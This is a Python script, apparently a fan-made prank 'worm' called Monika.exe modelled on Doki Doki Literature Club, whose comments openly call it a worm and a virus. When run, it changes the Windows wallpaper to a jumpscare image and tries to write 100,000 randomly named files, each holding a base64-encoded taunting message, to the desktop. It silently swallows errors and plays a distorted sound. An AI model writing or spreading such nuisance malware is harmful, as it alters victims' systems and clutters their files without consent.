#Imports:

import os
import ctypes
import random

from playsound import playsound
from string import *

##I see you have found the folder that controls all of this...
##You may be wondering why I made this?
##Truth be told, I wanted to make something resembling the game "Doki Doki Literature Club"
##A game that I truly love and enjoy.
##I based this worm off of Monika's character, as you can probably guess by the name "Monika.exe".
##However don't worry, this worm isn't deadly, it is just here to play around.
##And no, unlike in the game this will not un-alive anybody.
##R.I.P Sayori and Yuri my beloved :(

#__init__:

class init:

    def __init__(self):

        ##MAKE JUMPSCARE MONIKA BACKROUND:

        WALLPAPER_PATH = (r"C:\Users\Tomas\Desktop\Monika.exe\Images\TW9uaWth.png")

        ctypes.windll.user32.SystemParametersInfoW(20 , 0 , WALLPAPER_PATH , 0) #Make backround jumpscare Monika:

        ##MAKE A BUNCH OF "{Username}".chr FOLDERS:

        DIR_COUNT = len(os.listdir(r"C:\Users\Tomas\Desktop"))

        print(DIR_COUNT)

        try:

            for i in range(100000):

                File_Name = f"{random.choices(ascii_letters , k = 10)}.chr"

                with open(fr"C:\Users\Tomas\Desktop\{File_Name}" , "w+") as f:

                    f.write("SWYgeW91IHBsYXllZCB0aGUgZ2FtZSB5b3Ugd291bGQga25vdyBNb25pa2EncyBwb3dlci4uIA0KDQpXaHkgdGhlIGZ1Y2sgZGlkIHlvdSB0cnkgdG8gcnVuIHRoaXMgdG8gdGhpcyBhbnl3YXlzPz8gT3Igd2FzIGl0IGEgd29ybSwgd2hvIGtub3dzLCBNb25pa2EgaXMgZXZlcnl3aGVyZS4NCg0KQW55d2F5cywgc2ltcCBZdXJpIGFuZCBoYXZlIGEgR1JFQVQgZGF5IDwz")

                print("Created")

        except Exception:

            pass

        ##MAKE DISTORTED DDLC THEME PLAY:

        playsound("Sounds\TW9uaWthIGlzIGV2ZXJ5d2hlcmUsIGFsd2F5cyB3YXRjaGluZyB5b3UgOyk=.wav")

##RUN THE VIRUS:

if __name__ == "__main__":

    init()